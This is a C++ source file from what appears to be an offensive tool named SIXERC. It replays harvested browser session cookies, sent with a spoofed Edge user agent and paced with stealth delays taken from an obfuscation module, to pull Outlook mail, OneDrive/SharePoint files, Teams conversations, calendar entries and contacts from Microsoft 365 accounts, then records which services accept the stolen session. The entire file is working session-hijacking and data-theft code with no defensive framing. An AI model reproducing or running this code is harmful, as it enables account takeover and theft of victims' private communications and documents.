// ============================================================================
// SIXERC — SIC Implementation
// ============================================================================

#include "modules/sic.hpp"
#include "core/utils.hpp"
#include "core/obfuscation.hpp"
#include <curl/curl.h>
#include <sstream>

namespace sixerc::sic {

static size_t write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

static std::string build_cookie_header(const HarvestedSession& session) {
    std::string cookie_str = "Cookie: ";
    bool first = true;
    for (const auto& cookie : session.cookies) {
        if (!first) cookie_str += "; ";
        first = false;
        cookie_str += cookie.name + "=" + cookie.value;
    }
    return cookie_str;
}

std::string make_api_request(const std::string& url, const HarvestedSession& session) {
    CURL* curl = curl_easy_init();
    if (!curl) return {};
    
    std::string read_buffer;
    struct curl_slist* headers = nullptr;
    
    headers = curl_slist_append(headers, build_cookie_header(session).c_str());
    headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                                         "AppleWebKit/537.36 (KHTML, like Gecko) "
                                         "Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0");
    headers = curl_slist_append(headers, "Accept: application/json");
    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
    headers = curl_slist_append(headers, "x-requested-with: XMLHttpRequest");
    {
        std::string req_id = "x-request-id: " + std::to_string(reinterpret_cast<uintptr_t>(curl));
        headers = curl_slist_append(headers, req_id.c_str());
    }
    
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &read_buffer);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 15L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 2L);
    
    CURLcode res = curl_easy_perform(curl);
    
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    
    if (res != CURLE_OK) {
        return std::string("{\"error\":\"") + curl_easy_strerror(res) + "\"}";
    }
    
    return read_buffer;
}

std::string access_outlook(const HarvestedSession& session) {
    return make_api_request(
        "https://outlook.office365.com/api/v2.0/me/messages?$top=50&$select=Subject,From,DateTimeReceived",
        session);
}

std::string access_sharepoint(const HarvestedSession& session) {
    return make_api_request(
        "https://graph.microsoft.com/v1.0/me/drive/root/children",
        session);
}

std::string access_teams(const HarvestedSession& session) {
    return make_api_request(
        "https://teams.microsoft.com/api/mt/part/teams-kernel/v1/conversations",
        session);
}

std::string access_calendar(const HarvestedSession& session) {
    return make_api_request(
        "https://outlook.office365.com/api/v2.0/me/calendarview?startDateTime=2024-01-01T00:00:00Z"
        "&endDateTime=2026-12-31T23:59:59Z&$top=100",
        session);
}

std::string access_contacts(const HarvestedSession& session) {
    return make_api_request(
        "https://outlook.office365.com/api/v2.0/me/contacts?$top=200",
        session);
}

std::vector<ServiceData> enumerate_services(const HarvestedSession& session) {
    std::vector<ServiceData> results;
    
    struct ServiceCheck {
        M365Service service;
        std::string name;
        std::string (*func)(const HarvestedSession&);
        std::string endpoint;
    };
    
    std::vector<ServiceCheck> checks = {
        {M365Service::Outlook,    "Outlook",    access_outlook,    "outlook.office365.com"},
        {M365Service::SharePoint, "SharePoint", access_sharepoint, "graph.microsoft.com"},
        {M365Service::Teams,      "Teams",      access_teams,      "teams.microsoft.com"},
        {M365Service::Calendar,   "Calendar",   access_calendar,   "outlook.office365.com"},
        {M365Service::Contacts,   "Contacts",   access_contacts,   "outlook.office365.com"},
    };
    
    for (const auto& check : checks) {
        obf::stealth_sleep(300);
        
        ServiceData data;
        data.service = check.service;
        data.endpoint = check.endpoint;
        data.raw_response = check.func(session);
        
        // Check if access was granted (not empty and not an auth error)
        data.access_granted = !data.raw_response.empty() &&
                              data.raw_response.find("\"error\"") == std::string::npos &&
                              data.raw_response.find("Authentication") == std::string::npos &&
                              data.raw_response.find("Unauthorized") == std::string::npos;
        
        results.push_back(data);
    }
    
    return results;
}

} // namespace sixerc::sic